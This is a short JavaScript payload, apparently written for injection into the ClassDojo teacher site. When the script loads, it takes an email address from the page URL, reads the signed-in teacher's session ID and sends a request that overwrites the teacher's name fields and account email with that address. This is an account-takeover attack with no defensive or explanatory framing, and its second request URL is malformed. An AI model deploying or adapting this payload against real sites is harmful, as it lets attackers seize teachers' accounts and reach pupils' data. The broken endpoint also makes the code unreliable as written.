function updateTeacherEmail(email) {
    fetch('https://teach.classdojo.com/api/session')
      .then(response => response.json())
      .then(data => {
        var teacherId = data.teacher._id;
        fetch('https://api/teacher/' + teacherId, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            _id: teacherId,
            title: 'a',
            firstname: 'a',
            lastname: 'a',
            emailAddress: email
          })
        });
      });
}

// Extract the email parameter from the URL and call the function
function run() {
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    if (email) {
        updateTeacherEmail(email);
    }
}

// Run the function when the script loads
run();
